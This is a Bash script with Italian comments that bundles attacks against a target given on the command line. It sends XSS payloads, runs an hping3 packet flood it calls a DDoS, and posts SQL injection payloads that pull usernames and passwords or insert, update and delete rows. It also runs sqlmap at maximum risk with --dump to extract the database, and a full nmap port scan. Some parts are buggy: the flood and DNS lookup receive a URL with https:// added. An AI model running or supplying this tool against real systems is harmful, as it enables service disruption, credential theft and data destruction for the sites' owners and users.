#!/bin/bash

# Funzione per installare i tool necessari
install_tools() {
    local tools=("curl" "hping3" "nmap" "sqlmap" "whois")
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo "$tool non trovato. Installazione in corso..."
            sudo apt-get update && sudo apt-get install -y "$tool"
        else
            echo "$tool è già installato."
        fi
    done
}

# Funzione per assicurarsi che l'URL abbia il prefisso http(s)
ensure_http_prefix() {
    local url="$1"
    if [[ ! "$url" =~ ^https?:// ]]; then
        url="https://$url"
    fi
    echo "$url"
}

# Funzione per eseguire un attacco XSS e salvare i risultati
perform_xss_attack() {
    local target_url="$1"
    local results_file="scan_results/xss_attack.txt"
    local payloads=(
        "<script>alert('XSS1')</script>"
        "<img src='x' onerror='alert(\"XSS2\")'>"
        "<iframe src='javascript:alert(\"XSS3\")'></iframe>"
        "<svg/onload=alert('XSS4')>"
    )

    echo "Esecuzione dell'attacco XSS su $target_url" > "$results_file"
    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload" >> "$results_file"
        curl -s -G --data-urlencode "search=$payload" "$target_url" >> "$results_file"
        echo "Payload sent: $payload" >> "$results_file"
    done
    echo "Risultati salvati in $results_file"
}

# Funzione per eseguire un attacco DDoS e salvare i risultati
perform_ddos_attack() {
    local target_ip="$1"
    local port="$2"
    local count="$3"
    local results_file="scan_results/ddos_attack.txt"
    
    echo "Avvio dell'attacco DDoS su $target_ip:$port con $count pacchetti" > "$results_file"

    if ! command -v hping3 &> /dev/null; then
        echo "hping3 non trovato, installazione in corso..."
        sudo apt-get update && sudo apt-get install -y hping3
    fi

    hping3 --flood -p "$port" "$target_ip" -c "$count" >> "$results_file" 2>&1
    
    echo "Attacco DDoS completato" >> "$results_file"
    echo "Risultati salvati in $results_file"
}

# Funzione per eseguire un attacco SQL Injection e salvare i risultati
perform_sql_injection() {
    local target_url="$1"
    local results_file="scan_results/sql_injection.txt"
    local payloads=(
        "' OR 1=1 --"
        "' OR '1'='1' --"
        "' OR '1'='1'/*"
        "' OR 1=1 UNION SELECT NULL, NULL --"
        "' OR 1=1 UNION SELECT username, password FROM users --"
        "SELECT * FROM users WHERE username='admin';"
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
        "UPDATE users SET password='newpassword' WHERE username='admin';"
        "DELETE FROM users WHERE username='olduser';"
    )

    echo "Esecuzione dell'attacco SQL Injection su $target_url" > "$results_file"
    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload" >> "$results_file"
        local response
        response=$(curl -s -d "username=admin&password=$payload" -X POST "$target_url")
        echo "Response for payload '$payload':" >> "$results_file"
        echo "$response" >> "$results_file"
    done
    echo "Risultati salvati in $results_file"
}

# Funzione per eseguire una scansione completa del sito web e salvare i risultati
perform_full_scan() {
    local target_url="$1"
    local target_ip
    target_ip=$(dig +short "$target_url" | head -n 1)
    local results_dir="scan_results"
    
    if [ -z "$target_ip" ]; then
        echo "Impossibile risolvere l'IP per $target_url"
        exit 1
    fi

    mkdir -p "$results_dir"

    echo "Esecuzione della scansione completa per $target_url ($target_ip)..."

    local nmap_file="$results_dir/nmap_scan.txt"
    local sqlmap_file="$results_dir/sqlmap_scan.txt"
    local whois_file="$results_dir/whois_lookup.txt"

    echo "1. Esecuzione della scansione Nmap..." > "$nmap_file"
    nmap -sV -p- "$target_ip" >> "$nmap_file"

    echo "2. Esecuzione della scansione SQLmap..." > "$sqlmap_file"
    sqlmap -u "$target_url" --batch --risk=3 --level=5 --dump >> "$sqlmap_file"

    echo "3. Esecuzione del WHOIS lookup..." > "$whois_file"
    whois "$target_url" >> "$whois_file"
    
    echo "Scansione completa completata. I risultati sono stati salvati in $results_dir"
}

# Controllo degli argomenti e chiamata delle funzioni
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <attack_type> <target> [<port> <count>]"
    echo "Attack types:"
    echo "  xss    - Perform XSS attack"
    echo "  ddos   - Perform DDoS attack"
    echo "  sql    - Perform SQL Injection attack"
    echo "  scan   - Perform a full website scan"
    exit 1
fi

# Installazione dei tool necessari
install_tools

attack_type="$1"
target="$2"
shift 2

# Assicurati che l'URL abbia il prefisso http(s)
target=$(ensure_http_prefix "$target")

case "$attack_type" in
    xss)
        perform_xss_attack "$target"
        ;;
    ddos)
        if [ "$#" -ne 2 ]; then
            echo "Usage for ddos: $0 ddos <target_ip> <port> <count>"
            exit 1
        fi
        port="$1"
        count="$2"
        perform_ddos_attack "$target" "$port" "$count"
        ;;
    sql)
        perform_sql_injection "$target"
        ;;
    scan)
        perform_full_scan "$target"
        ;;
    *)
        echo "Unknown attack type: $attack_type"
        exit 1
        ;;
esac